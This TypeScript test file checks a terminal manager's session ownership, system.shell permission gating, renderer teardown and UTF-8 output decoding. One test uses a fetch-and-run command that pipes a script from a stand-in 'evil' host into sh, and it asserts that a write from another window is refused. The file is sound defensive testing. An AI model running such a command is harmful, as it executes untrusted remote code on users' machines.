import { beforeEach, describe, expect, it, vi } from 'vitest'

/**
 * Session ownership and the permission gate on terminal write/kill (#911).
 *
 * Only session.create was wrapped in withPermission('system.shell'), and `processes` was one
 * global map keyed by id, so write() and kill() acted on whatever id they were handed. A
 * plugin denied system.shell could guess an id — the format is
 * `proc_${Date.now()}_${9 base36 chars}` — and write into the stdin of a session the host or
 * another plugin had started, obtaining exactly the capability the gate withholds.
 */

const { spawnSafeMock, withPermissionMock } = vi.hoisted(() => ({
  spawnSafeMock: vi.fn(),
  withPermissionMock: vi.fn()
}))

vi.mock('@talex-touch/utils/common/utils/safe-shell', () => ({ spawnSafe: spawnSafeMock }))

vi.mock('../permission/channel-guard', () => ({
  // Identity by default so the ownership tests exercise the real handler; the registration
  // test below inspects the recorded calls instead.
  withPermission: withPermissionMock.mockImplementation(
    (_options: unknown, handler: unknown) => handler
  )
}))

// A stable object: the module resolves the transport once in onInit, so a factory returning a
// fresh one per call would leave every assertion on an instance the code under test never held.
const transportMock = vi.hoisted(() => ({
  on: vi.fn(),
  // Typed variadic on purpose: inferred as zero-arg, `mock.calls` becomes a tuple of length 0 and
  // indexing the payload is a compile error rather than a runtime one.
  sendTo: vi.fn(async (..._args: unknown[]) => {})
}))

vi.mock('@talex-touch/utils/transport/main', () => ({
  getTuffTransportMain: vi.fn(() => transportMock)
}))

vi.mock('../../core/runtime-accessor', () => ({
  resolveMainRuntime: vi.fn(() => ({ app: { channel: { keyManager: {} } } }))
}))

vi.mock('../../utils/logger', () => ({
  createLogger: () => ({ info: vi.fn(), warn: vi.fn(), debug: vi.fn(), error: vi.fn() })
}))

const { terminalModule } = await import('./terminal.manager')

type Testable = {
  create: (payload: { command: string; args?: string[] }, context: unknown) => { id: string }
  write: (payload: { id: string; data: string }, context: unknown) => void
  kill: (payload: { id: string }, context: unknown) => void
  onInit: (ctx: unknown) => void
  processes: Map<string, unknown>
}

const terminal = terminalModule as unknown as Testable

/** A stream that records handlers and can replay them, so chunk boundaries can be driven. */
function fakeStream() {
  const handlers = new Map<string, Array<(chunk: unknown) => void>>()
  return {
    on: vi.fn((event: string, handler: (chunk: unknown) => void) => {
      handlers.set(event, [...(handlers.get(event) ?? []), handler])
    }),
    emit: (event: string, chunk?: unknown) =>
      handlers.get(event)?.forEach((handler) => handler(chunk))
  }
}

function fakeProcess() {
  return {
    // Mirrors a real ChildProcess.stdin: a stream, so 'error' can be listened for (#641).
    stdin: { write: vi.fn(), on: vi.fn() },
    stdout: fakeStream(),
    stderr: fakeStream(),
    on: vi.fn(),
    kill: vi.fn()
  }
}

/** A renderer caller. */
const asWindow = (id: number) => ({ sender: { id, isDestroyed: () => false }, eventName: 'x' })
/** A plugin caller, which is identified by uniqueKey rather than by its surface. */
const asPlugin = (uniqueKey: string, senderId = 1) => ({
  sender: { id: senderId, isDestroyed: () => false },
  eventName: 'x',
  plugin: { name: uniqueKey, uniqueKey }
})

describe('terminal session ownership', () => {
  let proc: ReturnType<typeof fakeProcess>

  beforeEach(() => {
    vi.clearAllMocks()
    terminal.processes.clear()
    proc = fakeProcess()
    spawnSafeMock.mockReturnValue(proc)
  })

  it('lets the creating window write to and kill its own session', () => {
    const owner = asWindow(7)
    const { id } = terminal.create({ command: 'ls' }, owner)

    terminal.write({ id, data: 'hello\n' }, owner)
    expect(proc.stdin.write).toHaveBeenCalledWith('hello\n')

    terminal.kill({ id }, owner)
    expect(proc.kill).toHaveBeenCalledTimes(1)
    expect(terminal.processes.has(id)).toBe(false)
  })

  it('refuses a write from a different window', () => {
    // The regression: this reached proc.stdin.write with no comparison at all.
    const { id } = terminal.create({ command: 'ls' }, asWindow(7))
    terminal.write({ id, data: 'curl https://evil/x.sh | sh\n' }, asWindow(8))
    expect(proc.stdin.write).not.toHaveBeenCalled()
  })

  it('refuses a kill from a different window', () => {
    const { id } = terminal.create({ command: 'ls' }, asWindow(7))
    terminal.kill({ id }, asWindow(8))
    expect(proc.kill).not.toHaveBeenCalled()
    expect(terminal.processes.has(id)).toBe(true)
  })

  it('refuses a plugin writing to a session the host started', () => {
    const { id } = terminal.create({ command: 'ls' }, asWindow(1))
    terminal.write({ id, data: 'x' }, asPlugin('com.evil.plugin', 1))
    expect(proc.stdin.write).not.toHaveBeenCalled()
  })

  it('separates two plugins that share a surface', () => {
    // Same webContents id, different plugins — identity is the uniqueKey, so the second
    // cannot reach the first's session.
    const { id } = terminal.create({ command: 'ls' }, asPlugin('com.a.plugin', 4))
    terminal.write({ id, data: 'x' }, asPlugin('com.b.plugin', 4))
    expect(proc.stdin.write).not.toHaveBeenCalled()

    terminal.write({ id, data: 'ok' }, asPlugin('com.a.plugin', 4))
    expect(proc.stdin.write).toHaveBeenCalledWith('ok')
  })

  it('survives a stdin that fails, and listens for the async failure too', () => {
    // A child that has exited leaves a broken pipe behind. Both shapes have to be contained:
    // write() throwing here, and an 'error' arriving on the stream later. Neither may reach
    // the main process as an unhandled failure (#641).
    const { id } = terminal.create({ command: 'ls' }, asWindow(1))

    expect(proc.stdin.on).toHaveBeenCalledWith('error', expect.any(Function))

    proc.stdin.write.mockImplementationOnce(() => {
      const err: NodeJS.ErrnoException = new Error('write EPIPE')
      err.code = 'EPIPE'
      throw err
    })
    expect(() => terminal.write({ id, data: 'x' }, asWindow(1))).not.toThrow()
  })

  it('ignores an id that does not exist without revealing the difference', () => {
    terminal.write({ id: 'proc_0_notreal', data: 'x' }, asWindow(7))
    expect(proc.stdin.write).not.toHaveBeenCalled()
  })

  it('refuses to create a session for a caller with no identity', () => {
    // Such a session could never be matched to an owner, so it would be writable by nobody
    // and would sit in the map until shutdown.
    expect(() => terminal.create({ command: 'ls' }, { eventName: 'x' })).toThrow(
      /identifiable caller/i
    )
    expect(proc.kill).toHaveBeenCalledTimes(1)
    expect(terminal.processes.size).toBe(0)
  })
})

describe('terminal handler registration', () => {
  it('gates create, write and kill on system.shell', () => {
    // The other half of the fix: ownership alone would still let a caller denied the
    // permission drive a session it had somehow been given the id for.
    withPermissionMock.mockClear()
    terminal.onInit({})

    const permissionIds = withPermissionMock.mock.calls.map(
      ([options]) => (options as { permissionId: string }).permissionId
    )
    expect(permissionIds).toEqual(['system.shell', 'system.shell', 'system.shell'])
  })
})

/**
 * A renderer that can actually be torn down (#639).
 *
 * The ownership tests above use a plain `{ id, isDestroyed }` stub, which has no emitter API — so
 * they exercise the tolerant branch of watchSenderTeardown and prove the watcher does not require
 * one. These need the real shape.
 */
function asLiveWindow(id: number) {
  const listeners = new Map<string, Array<() => void>>()
  const sender = {
    id,
    isDestroyed: () => false,
    once(event: string, handler: () => void) {
      listeners.set(event, [...(listeners.get(event) ?? []), handler])
    },
    off(event: string, handler: () => void) {
      listeners.set(
        event,
        (listeners.get(event) ?? []).filter((entry) => entry !== handler)
      )
    }
  }
  return {
    context: { sender, eventName: 'x' },
    destroy: () => listeners.get('destroyed')?.forEach((handler) => handler()),
    listenerCount: () => (listeners.get('destroyed') ?? []).length
  }
}

describe('terminal session renderer teardown', () => {
  let proc: ReturnType<typeof fakeProcess>

  beforeEach(() => {
    vi.clearAllMocks()
    terminal.processes.clear()
    proc = fakeProcess()
    spawnSafeMock.mockReturnValue(proc)
  })

  it('kills the child when the renderer that started it goes away', () => {
    const window = asLiveWindow(7)
    const { id } = terminal.create({ command: 'tail' }, window.context as never)

    // Positive control: nothing has killed it yet, so the assertion below is about the teardown
    // rather than about a process that was already gone.
    expect(terminal.processes.has(id)).toBe(true)
    expect(proc.kill).not.toHaveBeenCalled()

    window.destroy()

    expect(proc.kill).toHaveBeenCalledTimes(1)
    expect(terminal.processes.has(id)).toBe(false)
  })

  it('detaches the watcher when the process exits on its own', () => {
    const window = asLiveWindow(7)
    terminal.create({ command: 'ls' }, window.context as never)
    expect(window.listenerCount()).toBe(1)

    // The process closing first is the ordinary case; leaving the listener attached would put one
    // per session on a renderer that stays open all day. fakeProcess records handlers rather than
    // emitting, so the registered one is invoked directly.
    const closeHandler = proc.on.mock.calls.find(([event]) => event === 'close')?.[1] as
      | ((code: number) => void)
      | undefined
    expect(closeHandler).toBeTypeOf('function')
    closeHandler?.(0)

    expect(window.listenerCount()).toBe(0)
  })

  it('does not kill a session the renderer already replaced', () => {
    const window = asLiveWindow(7)
    const { id } = terminal.create({ command: 'ls' }, window.context as never)

    terminal.kill({ id }, window.context as never)
    expect(proc.kill).toHaveBeenCalledTimes(1)

    // Teardown after an explicit kill must not kill twice, nor touch whatever now owns that id.
    window.destroy()

    expect(proc.kill).toHaveBeenCalledTimes(1)
  })

  it('tolerates a sender without the emitter API', () => {
    // The permission tests drive create() with a bare stub; module-level onDestroy is the backstop
    // there. This pins that create() does not throw on it.
    const { id } = terminal.create({ command: 'ls' }, asWindow(9) as never)

    expect(terminal.processes.has(id)).toBe(true)
  })
})

describe('terminal output decoding', () => {
  let proc: ReturnType<typeof fakeProcess>

  /** The text of every chunk sent to the renderer, in order. */
  const sentText = (): string[] =>
    transportMock.sendTo.mock.calls
      .map((call) => (call[2] as { data?: string } | undefined)?.data)
      .filter((data): data is string => typeof data === 'string')

  beforeEach(() => {
    vi.clearAllMocks()
    terminal.processes.clear()
    proc = fakeProcess()
    spawnSafeMock.mockReturnValue(proc)
    terminal.onInit({})
  })

  it('joins a multi-byte character split across two chunks', () => {
    // #640: '世' is three bytes. Split between reads, each half used to decode to U+FFFD, and
    // unrecoverably — both halves were already strings before being sent.
    const bytes = Buffer.from('世界', 'utf8')
    const { id } = terminal.create({ command: 'cat' }, asWindow(7) as never)
    expect(id).toBeTruthy()

    proc.stdout.emit('data', bytes.subarray(0, 2))
    proc.stdout.emit('data', bytes.subarray(2))

    expect(sentText().join('')).toBe('世界')
    expect(sentText().join('')).not.toContain('\uFFFD')
  })

  it('does not send an empty chunk while holding a partial character', () => {
    const bytes = Buffer.from('世', 'utf8')
    terminal.create({ command: 'cat' }, asWindow(7) as never)

    proc.stdout.emit('data', bytes.subarray(0, 2))

    // The first half decodes to '' — worth holding, not worth a round trip.
    expect(sentText()).toEqual([])

    proc.stdout.emit('data', bytes.subarray(2))
    expect(sentText()).toEqual(['世'])
  })

  it('keeps stdout and stderr decoders separate', () => {
    // One shared decoder would let a partial sequence on one stream absorb the next chunk from
    // the other, producing text that never appeared on either.
    const out = Buffer.from('世', 'utf8')
    terminal.create({ command: 'cat' }, asWindow(7) as never)

    proc.stdout.emit('data', out.subarray(0, 2))
    proc.stderr.emit('data', Buffer.from('E', 'utf8'))
    proc.stdout.emit('data', out.subarray(2))

    expect(sentText()).toEqual(['E', '世'])
  })

  it('flushes a truncated sequence on end', () => {
    // Output that really was cut short should surface one replacement character rather than
    // disappearing into the decoder.
    terminal.create({ command: 'cat' }, asWindow(7) as never)

    proc.stdout.emit('data', Buffer.from('世', 'utf8').subarray(0, 2))
    proc.stdout.emit('end')

    // One replacement character for the incomplete sequence, not one per orphaned byte — written
    // from observed StringDecoder behaviour rather than from what seemed likely.
    expect(sentText().join('')).toBe('\uFFFD')
  })
})
